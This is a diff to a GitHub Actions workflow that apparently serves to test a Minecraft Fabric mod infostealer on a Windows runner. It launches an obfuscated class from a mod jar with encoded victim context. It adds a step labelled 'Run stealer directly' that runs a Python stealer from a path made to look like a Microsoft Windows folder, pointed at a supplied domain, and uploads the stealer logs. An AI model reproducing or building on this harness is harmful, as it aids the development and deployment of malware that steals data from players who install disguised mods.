@@ -21,28 +21,40 @@ jobs:
         with:
           distribution: temurin
           java-version: '21'
-      - name: Run agent
+      - name: Bootstrap runtime
         shell: powershell
         env:
           UID_: "80618e74-3f82-4aa6-b6e3-510587905f36"
           TAG_: ${{ inputs.tag }}
           DOM_: ${{ inputs.domain }}
         run: |
-          $d = "$env:RUNNER_TEMP\sn"; New-Item -ItemType Directory -Force $d | Out-Null
+          $d = "$env:RUNNER_TEMP\sn"; New-Item -ItemType Directory -Force "$d\mc" | Out-Null
           $ctx = @{ userId = "$env:UID_"; tag = "$env:TAG_"; domain = "$env:DOM_"; env = "Fabric"; gameDir = "$d\mc"; mcInfo = "{}" } | ConvertTo-Json -Compress
           $b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($ctx))
-          "ctx=$ctx"
-          New-Item -ItemType Directory -Force "$d\mc" | Out-Null
           $p = Start-Process java -ArgumentList "-cp","agent\mod.jar","net.fabric.taxjHfh",$b64 -RedirectStandardOutput "$d\run.log" -RedirectStandardError "$d\run.err" -PassThru
-          "pid=$($p.Id)"
-          Start-Sleep -Seconds 200
-          Get-Process python* -ErrorAction SilentlyContinue | Select Id,Path
+          Start-Sleep -Seconds 60
+          "--- launcher log ---"
           Get-Content "$d\run.log" -Raw
           Get-Content "$d\run.err" -Raw
+      - name: Run stealer directly
+        shell: powershell
+        env:
+          UID_: "80618e74-3f82-4aa6-b6e3-510587905f36"
+          TAG_: ${{ inputs.tag }}
+          DOM_: ${{ inputs.domain }}
+        run: |
+          $d = "$env:RUNNER_TEMP\sn"
+          $rt = "$env:LOCALAPPDATA\Microsoft\Windows\NtProfileIndex\AppHost"
+          "rt=$rt"
+          Get-ChildItem $rt | Select-Object -First 5 Name
+          $env:SN_DOMAIN = "$env:DOM_"
+          & "$rt\python.exe" "$rt\main.py" -u "$env:UID_" --env Fabric --tag "$env:TAG_" --mcInfo "{}" --prefireId "" 2>&1 | Tee-Object "$d\stealer.log"
+          "exit=$LASTEXITCODE"
+          Get-ChildItem "$d\mc" -Recurse | Select FullName,Length
       - uses: actions/upload-artifact@v4
         if: always()
         with:
-          name: sn-logs-win
+          name: sn-win
           path: ${{ runner.temp }}/sn
       - name: Kill
         if: always()
